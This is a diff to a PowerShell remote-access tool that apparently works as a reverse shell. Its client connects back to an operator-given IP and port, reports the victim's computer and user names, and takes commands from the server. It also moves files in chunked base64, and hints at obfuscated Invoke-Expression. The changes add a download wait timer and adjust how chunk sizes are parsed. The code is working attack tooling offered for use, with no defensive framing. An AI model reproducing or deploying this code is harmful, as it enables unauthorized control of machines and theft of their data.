@@ -46,7 +46,6 @@ if ($args[2] -eq $null){ Show-Banner ; Show-Help ; Write-Host "[!] Not enough pa
 $IP = $args[1]
 $Port = $args[2]
 $Start = "True"
-$Chunk = $args[4]
 $DataCount = 1
 $remotepath = $home
 $Alias1 = "Invoke" ; $Alias2 = "Express"
@@ -56,6 +55,15 @@ if ($OSVersion -like "*Win*"){ $localslash = "\" } else { $localslash = "/" }
 $symbols = '.........".$.}.{.>.<.*.%.;.:./.\.(.).@.~.=.].[.!.?.^.&.#.|.........'
 
 # Functions
+function WaitforDownload {
+$cursortop = [System.Console]::get_CursorTop() ; $WaitCount = $Seconds ; $WaitCount++
+do { if ($WaitCount -ne 0) { Write-Host "WAITING: $WaitCount" -ForegroundColor Yellow -NoNewline ; $WaitCount-- }
+[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "                              " -ForegroundColor Yellow -NoNewline
+[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "WAITING: $WaitCount" -ForegroundColor Yellow -NoNewline
+Start-Sleep 1 } until ($WaitCount -eq 0) ; [Console]::SetCursorPosition(0,"$cursortop")
+Write-Host "                              " -ForegroundColor Yellow -NoNewline
+[Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "" -ForegroundColor Yellow -NoNewline }
+
 function GetChunk {
 $text = $args[0] ; $i = 0
 while ($i -le ($text.length-$Chunk)){ $text.Substring($i,$Chunk) ; $i += $Chunk }
@@ -140,9 +148,11 @@ $remotepath = $remotepath.replace("'","").replace('"','')
 
 $stream.Write([text.Encoding]::Ascii.GetBytes($command), 0, $command.Length)
 $client.Close() ; $Listener.Stop()
+if ($download -eq "True"){ if ($args -like "*-wait*"){ WaitforDownload ; $Multi = "True" ; $download = "False"
+Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline ; $MultiDown = "True" }}
 
 # Receive command output
-Start-Sleep -milliseconds 500
+Start-Sleep -milliseconds 500 ; [int]$Seconds = $args[4]
 if ($PSexit -eq "True"){ Write-Host "[!] Exiting!`n" -ForegroundColor Red ; exit }
 $Listener.Start()
 $client = $Listener.AcceptTcpClient()
@@ -157,7 +167,7 @@ $data = $null ; if ($path -like "*\*"){ $remoteslash = "\" } else { $remoteslash
 
 elseif ($download -eq "True"){
 if ($(R64Decoder -t $data) -eq "[+] Sending MultiPart Data.."){ $data = $null
-Write-Host "[+] Receiving MultiPart Data" -ForegroundColor Yellow -NoNewline
+Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline
 $Multi = "True" ; $download = "False" ; $MultiDown = "True" }
 else { R64Decoder -f $data $downfile
 $data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $download = "False" }}
@@ -167,7 +177,7 @@ if ($MultiDown -eq "True"){ $Multi = "False" ; $data = R64Decoder -f $multidata 
 $data = "[+] File downloaded on $pwd$localslash$downfile!`n" ; $DataCount = 1 ; $multidata = $null ; Write-Host "`n" }
 else { $Multi = "False" ; $data = R64Decoder -t $multidata ; $multidata = $null ; Write-Host "`n" }}
 else { $cursortop = [System.Console]::get_CursorTop() ; $multidata += $data ; $data = $null
-Write-Host "." -ForegroundColor Yellow -NoNewline ; $DataCount++ ; if ($DataCount -eq 11){ $DataCount = 1
+Write-Host "." -ForegroundColor Yellow -NoNewline ; $DataCount++ ; if ($DataCount -eq 8){ $DataCount = 1
 [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "                                          " -ForegroundColor Yellow -NoNewline
 [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "[+] Receiving MultiPart Data.." -ForegroundColor Yellow -NoNewline }}}
 
@@ -193,7 +203,7 @@ $ClientData | Add-Member -MemberType NoteProperty -Name ComputerName -Value $([S
 $ClientData | Add-Member -MemberType NoteProperty -Name UserName -Value $([System.Environment]::UserName.tolower())
 
 # Read command from server
-Start-Sleep -milliseconds 500
+Start-Sleep -milliseconds 500 ; [int]$Chunk = $args[4]
 $tcpConnection = New-Object System.Net.Sockets.TcpClient("$IP", "$Port")
 $ClientData | Add-Member -MemberType NoteProperty -Name Address -Value $($tcpconnection.client.localendpoint.address.ipaddresstostring)
 $tcpStream = $tcpConnection.GetStream()
